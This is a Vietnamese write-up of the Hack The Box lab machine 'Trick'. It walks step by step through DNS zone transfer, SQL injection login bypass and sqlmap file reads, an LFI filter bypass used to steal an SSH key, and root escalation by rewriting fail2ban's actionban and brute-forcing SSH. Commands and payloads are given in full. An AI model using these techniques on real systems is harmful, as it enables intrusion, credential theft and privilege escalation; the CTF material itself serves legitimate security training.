# `QUICK OVERVIEW`  

<table>
<th style="text-align: center">
<img width="600" height="1">

```
BOX INFO
```

</th>

<th style="text-align: center">
<img width="350" height="1">

```
TABLE OF CONTENT
```

</th>
<tr>

<td>      
<img width="600" height="1">

<table style="table-layout: auto;width: 600px">
  <thead>
    <tr>
      <th width="25%">Name</th>
      <th style="text-align: right;font-size: x-large;">
        <img src="../../attachments/ca56ef43d636aff7da48a8b484756cfe_thumb.png" width="35px" align="center"> 
        <code> Trick </code>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Release Date</td>
      <td style="text-align: right"> 18 Jun 2022 </td>
    </tr>
    <tr>
      <td>Difficulty</td>
      <td style="text-align: right"> Easy </td>
    </tr>
    <tr>
      <td>OS</td>
      <td style="text-align: right"> Linux 🐧 </td>
    </tr>    
    <tr>
      <td>Base Points</td>
      <td style="text-align: right"><span class="diff-Hard"><strong>20</strong></span></td>
    </tr>
    <tr>
      <td>Date Completed</td>
      <td style="text-align: right"> 22 Jul 2022 </td>
    </tr>    
  </tbody>
</table>


**Tags:**  `DNS` ,`SQLi`, `heavy-enumration`, `source-code-analysis`,  `LFI`, `Fail2ban` 
</td>

<td>

- [`QUICK OVERVIEW`](#quick-overview)
- [`ENUMRATION`](#enumration)
  - [`🛸` Web Services Enumeration](#-web-services-enumeration)
  - [`🛸` DNS Service Enumration](#-dns-service-enumration)
- [`EXPLOITATION`](#exploitation)
  - [`👨‍🚀` User Own](#-user-own)
- [`PRIVILEDGE ESCALATION`](#priviledge-escalation)
  - [`👽` Root Own](#-root-own)
</td>

</tr></table>

# `ENUMRATION`

Như thường lệ, sử dụng NMAP để scan các ports, services của target.

```console
kali@kali:~/machines.HTB/Trick/Enum$ export IP=10.10.11.166
```

```console
kali@kali:~/machines.HTB/Trick/Enum$ export ports=$(sudo nmap $IP -p- --min-rate=1000 -oN 
scan_ports.txt|grep ^[0-9]|cut -d "/" -f 1|tr "\n" ","|sed s/,$//)
```

```console
kali@kali:~/machines.HTB/Trick/Enum$ sudo nmap $IP -p$ports -sV -sC -oN scan_services.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 12:35 EDT
PORT   STATE SERVICE VERSION                                                                          
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                   
| ssh-hostkey:                                                                                        
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)                                        
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)                                       
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)                                     
25/tcp open  smtp    Postfix smtpd                                                                    
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000,
VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
SMTPUTF8, CHUNKING                                                                
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)                                    
| dns-nsid:                                                                                           
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian                                                        
80/tcp open  http    nginx 1.14.2                                                                     
|_http-title: Coming Soon - Start Bootstrap Theme                                                     
|_http-server-header: nginx/1.14.2                                                                    
Service Info: Host:  debian.localdomain; OS: Linux; CPE: 
cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results 
at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.44 seconds
```

***Pirority of  Attack & Enumration Vector***: 

> 80 http → 53 dns → 25 smtp → 22 ssh

## `🛸` Web Services Enumeration
Dưới đây là giao diện sơ lược của trang web có địa chỉ IP: `10.10.11.166`

![](../../attachments/Screenshot_2022-07-24_12_40_30.png)

**Enumration Vectors:**
→ Fuzzing directories, files, parameter → Manual Inspection (*View the source, Luke !*)
Sau khi thực hiện các thao tác Enum cơ bản trên, ta không thấy có gì thú vị ở đây cả, chỉ đơn thuần là một trang web tĩnh. (Tạm thời để sang một bên ha 🐧)

## `🛸` DNS Service Enumration
Thực hiện truy vấn các Record cũng như xác định Transfer Zone của `target`

```console
kali@kali:~/machines.HTB/Trick/Enum$ nslookup                           
> server 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
```

Biết được  `target` hiện tại có NS record là `trick.htb`.

```console
kali@kali:~/machines.HTB/Trick/Enum$ dig axfr @10.10.11.166 trick.htb +noall +answer 
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

Tiếp tục enum trên Transfer Zone, phát hiện ra có 1 CNAME mới → `preprod-payroll.trick.htb`

Truy cập vào trang DNS vừa tìm được. Ta đã được chuyển hướng đến 1 trang web có giao diện mới, trông có vẻ là 1 trang của admin.

 ![](../../attachments/Pasted_image_20220725073030.png)

Ở đây có thể thực hiện các bước enum cơ bản như trên. Nhưng khi ta thấy 1 trang có chức năng login thì làm gì? Thưc hiện Test SQLi 
thôi 🐧

	→ Simple payloads: ', ", \, ;, ...

 ![](../../attachments/Pasted_image_20220725074440.png)

À ha, với payload `username' or 1=1#` ta đã đăng nhập được vào trang web → Bị SQLi  → cụ thể là Blind SQLi.

 ![](../../attachments/Pasted_image_20220725074546.png)

Một hồi dạo quanh trang web, có vẻ như trang web này không có tính năng nào thú vị để khai thác, chỉ đơn thuần là CRUD.
# `EXPLOITATION`
Với các thông tin trên, sử dụng công cụ `sqlmap` để dễ dàng khai thác lỗ hổng trang web một cách nhanh chóng.

Bắt gói tin POST khi đăng nhập, và ghi nó vào file `trick.req` để chuẩn bị cho việc sử dụng `sqlmap`

```console
kali@kali:~/machines.HTB/Trick/exploit$ cat trick.req 
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=kuiun3iismcup936p4bh4qbce3

username=username&password=password
```

Thực hiện lấy thông tin các `database` hiện có trong server.

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --dbs --batch
<--SNIP-->
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=username' AND (SELECT 6229 FROM (SELECT(SLEEP(5)))QBCU) AND 'zlTF'='zlTF&password=password
---
<--SNIP-->
available databases [2]:
[*] information_schema
[*] payroll_db

```

→ Ngoài database mặc định ra của MySQL thì có database `payroll_db`.

Tiếp theo lấy các `tables` có trong `payroll_db`.

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --tables -D payroll_db
<--SNIP-->
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

→ Có tổng cộng 11 `tables`, quan sát thấy `table` ***users*** (có vẻ như đây là table chứa các thông tin đăng nhập vào trang web)  

Thực hiện enum xem có `table` này có tổng cộng bao nhiêu `attributes` hay `columns`.

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --columns -D payroll_db -T users --batch
<--SNIP-->
Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| name      | varchar(200) |
| password  | varchar(200) |
| type      | tinyint(1)   |
| username  | varchar(100) |
+-----------+--------------+
```

Tiếp tục dump `username`, `password` của từng user có trong bảng `users`

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --dump -D payroll_db -T users -C username,password --batch
<--SNIP-->
Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+
```

→ chỉ có 1 user duy nhất và cũng là Admin duy nhất (Không có gì mới).

Đã vậy, xem thử mình có quyền đọc file không ha. Để kiểm tra thì ta sẽ đọc file passwd của server.

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --file-read '/etc/passwd' --batch --threads 10
<--SNIP-->
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
```

→ Ngon, ta hoàn toàn có quyền đọc file.

Sau khi nhìn nhanh file /etc/passwd. Phát hiện có  một user tên  `michael`.  

```console
kali@kali:~/…/share/sqlmap/output/preprod-payroll.trick.htb$ cat files/_etc_passwd 
root:x:0:0:root:/root:/bin/bash
<--SNIP-->
michael:x:1001:1001::/home/michael:/bin/bash
```

Vậy ngoài đọc file /etc/passwd, mình có thể làm được gì nữa ta?

→ Đọc source code của chương trình, file config của server. 

	→ Nhưng để đọc được thì cần phải biết file này nằm ở đâu.

Mình đã sử dụng curl để xem server trả về những thông tin gì, và xem thử có thông tin về loại server đang host hay không *(thông tin này tạm tin thôi 🐧)*

```console
kali@kali:~$ curl -I http://trick.htb/                            
HTTP/1.1 200 OK
Server: nginx/1.14.2
<--SNIP-->

kali@kali:~$ curl -I http://preprod-payroll.trick.htb/
HTTP/1.1 302 Found
Server: nginx/1.14.2
<--SNIP-->
```

→ Có vẻ như là `taret` sử dụng `nginx` để host.
+ Default root directory của `nginx` là `/var/www/html/`.
+ Default directory chứa file cấu hình của `nginx` là `/etc/nginx/`.

Nhưng ở đây cùng 1 server lại có nhiều hơn 1 trang web đang được host → có nhiều root directories tương ứng cho từng web → suy đoán: 
+ `/var/www/html` là của trang `trick.htb`
+ `/var/www/payroll `là của trang `preprod-payroll.trick.htb`

**Kiểm tra:** 

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --file-read '/var/www/html/index.html' --batch --threads 10

kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --file-read '/var/www/payroll/index.php' --batch --threads 10
```

→ Có kết quả trả về → ✔️ suy đoán đúng

Tìm kiếm thêm được file `db_connector.php` ở trong `/var/www/payroll` có chứa username, password của mysql.

```php
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

Tạm thời bỏ qua việc đọc file trong thư mục root, do không có gì thú vị. 

Tiến hành đọc file config của `nginx`

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --file-read '/etc/nginx/nginx.conf' --batch --threads 10
<--SNIP->
46174613B0A776F726B65725F70726F636573736573206175746F3B0A706964202F72756E2F6E67696E782E7069643B0A696E636C756465202F6574632F6E67696E782F6D6F64756C65732D656E61626C65642F2A2E636F6E663B0A0A6576656E7473207B0A09776F726B65725F636F6E6E656374696F6E73203736383B0A0923206D756C74695F616363657074206F6E3B0A7D0A0A68747470207B0A0A0923230A09232042617369632053657474696E6773
<--SNIP-->
```

Đọc nội dung của `/etc/nginx/nginx.conf`, cho ta thấy các cấu hình cho `vhost` nằm ở trong 2 thư mục chính  `/etc/nginx/conf.d/` và `/etc/nginx/sites-enabled/`.

```console
kali@kali:~/…/sqlmap/output/preprod-payroll.trick.htb/files$ cat _etc_nginx_nginx.conf

user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

<--SNIP-->

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


<--SNIP-->
```

Việc đọc file thông qua blind SQLi này rất mất thời gian, để tiết kiệm .Trong 2 thư mục trên, mình đã search thử xem các file nào cần thiết và phổ biến nhất thì được  →  `/etc/nginx/sites-enabled/default`

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --threads 10 --batch --file-read '/etc/nginx/sites-enabled/default' 
<--SNIP-->
36572766572207B0A096C697374656E2038302064656661756C745F7365727665723B0A096C697374656E205B3A3A5D3A38302064656661756C745F7365727665723B0A097365727665725F6E616D6520747269636B2E6874623B0A09726F6F74202F7661722F7777772F68746D6C3B0A0A09696E64657820696E6465782E68746D6C20696E6465782E68746D20696E6465782E6E67696E782D64656269616E2E68746D6C3B0A0A097365727665725F6E616D65205F3B0A0A096C6F636174696F6E202F207B0A09097472795F66696C6573202475726920247572692F203D3430343B0A097D
<--SNIP-->
```

**Pingo**, các cấu hình trong file `/etc/nginx/sites-enabled/default` đã cho chúng ta kha khá thông tin cần thiết.

```console
kali@kali:~/…/sqlmap/output/preprod-payroll.trick.htb/files$ cat
_etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

→ Phát hiện ngoài ***vhost*** `payroll` ra còn có `market` với các thông tin như sau:
+ URL: `http://preprod-marketing.trick.htb`
+ Root Directory: `/var/www/market`

 ![](../../attachments/Pasted_image_20220725083859.png)

Thực hiện lấy nội dung file `/var/www/market/index.php`

```console
kali@kali:~/machines.HTB/Trick/exploit$ sqlmap -r trick.req --file-read '/var/www/market/index.php' --batch --threads 10
```

Nhìn nhanh nội dung của trang `index.php` này, ta thấy trang web bị `path traversal` cùng với 1 sink nguy hiểm là `include`.

```php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
	include("/var/www/market/".str_replace("../","",$file));
}
?>
```

Mặc dù anh lập trình viên có cố gắng replace `../` thành ` ` thì ta vẫn hoàn toàn có thể bypass được. 

> **Nhận xét ngoài lề:** Cách chống path traversal này chỉ hoạt động khi thực hiện recursive hoặc các chuỗi có độ dài là 1.

**Payload:** 

```console
curl http://preprod-marketing.trick.htb/index.php?page=....//....//..../{file}
```

Với các thông tin từ trước, ta phát hiện có user tên `michael` và `port 22` đang mở → **Sinh ra 1 giả thuyết:** rằng ở thư mục home của `michael` có chứa foldr `.ssh` và trong đó có chứa key ssh.

```console
kali@kali:~$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
<-SNIP→
fvJDZa67XNHzrxi+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

→ Ngon, giả thuyết hoàn toàn đúng. Thực hiện kết nối tới server bằng ssh rồi lấy flag thôi. 

## `👨‍🚀` User Own

```console
kali@kali:~/machines.HTB/Trick/exploit$ ssh michael@10.10.11.166 -i id_rsa
michael@trick:~$ cat user.txt 
################################
```

# `PRIVILEDGE ESCALATION`
Để thực hiện leo thang đặc quyền, ta cần phải thực hiện các bước enum thông thường bằng tay trước: [S1REN's way](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)

Sau khi kiểm tra với `ps -aux`, ta thấy `fail2ban` service đang chạy. Và với lệnh `sudo -l`, ta phát hiện thêm user `michael` hoàn toàn có thể chạy lệnh restart `fail2ban` dưới quyền roo mà không cần password

```console
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

`fail2ban` sẽ xác định các `service` bằng các config nằm trong file `jail.conf` ở thư mục `/etc/fail2ban` và các hành động cấm như thế nào sẽ do các files cấu hình trong thư mực `/etc/fail2ban/action.d`. Chi tiết cách exploit [here](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7).

Kiểm tra cấu hình file `/etc/fail2ban/jail.con`:

```shell
[DEFAULT]

#
# MISCELLANEOUS OPTIONS
#
<--SNIP-->
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5

<--SNIP-->

#
# ACTIONS
#
<--SNIP-->
#
# Action shortcuts. To be used to define action parameter

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports

<--SNIP-->

#
# JAILS
#

#
# SSH servers
#

[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s

[dropbear]

port     = ssh
logpath  = %(dropbear_log)s
backend  = %(dropbear_backend)s


[selinux-ssh]

port     = ssh
logpath  = %(auditd_log)s
<--SNIP-->
```

→ Với các cấu hình trên, ta có max 5 lần thử sai trước khi bị ban, các hành động ban sẽ phụ thuộc vào file  `iptables-multiport` nằm trong thư mục `/etc/fail2ban/action.d`

Tiếp theo xem các action ban trong file `iptables-multiport.conf`

```shell
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

→ **Idea**: bây giờ chỉ cần thay đổi command của actionban và thực hiện bruteforce ssh để invoke actionban → command chạy bằng quyền roo → PWN.

Nhưng vấn đề ở đây, `michael` không có quyền write trên thư mục này.

```console
michael@trick:/etc/fail2ban/action.d$ ls -la | grep iptables-multiport
-rw-r--r-- 1 root root      1420 Jul 22 21:03 iptables-multiport.conf
-rw-r--r-- 1 root root      2082 Jul 22 21:03 iptables-multiport-log.conf
```

Ngoài ra, khi kiểm tra `permission` trong thư mục `/etc/fail2ban`,  ta thấy group `security` own thưc mục `action.d/` và có quyền `rwx`.

```console
michael@trick:/etc/init.d$ cd /etc/fail2ban/
michael@trick:/etc/fail2ban$ ls -la
total 76
<--SNIP-->
drwxrwx---   2 root security  4096 Jul 22 20:57 action.d
<--SNIP-->
```

May thay,  `michael` thuộc group `security` .

```console
michael@trick:/etc/fail2ban$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

## `👽` Root Own

→ **Plan**: Thực hiện tạo một file `iptables-multiport.conf` mới và rename file `iptables-multiport.conf` cũ thành `iptables-multiport.conf.bak` . Trong file mới, ta sẽ thêm command mà ta muốn. Có thể là reverse shell hoặc là set SUID cho /bin/bash, ... .

```console
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
```

Ở đây, mình sẽ copy file root.txt thành một file khác và cấp quyền cho ai cũng đọc được

```shell
actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
```

Rồi restart service `fail2ban`.

```console
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
```

Tiếp theo chuẩn bị 2 file username.txt và password.txt để bruteforce ssh. Ở đây mình sẽ sử dụng công cụ nmap với script có sẵn 

```console
kali@kali:~/machines.HTB/Trick/exploit$ sudo nmap trick.htb -p 22 --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt
```

Cuối cùng là chờ đợi, cho đến khi xuất hiện xuất hiện file 

```console
michael@trick:~$ cat /tmp/root.txt
################################
```
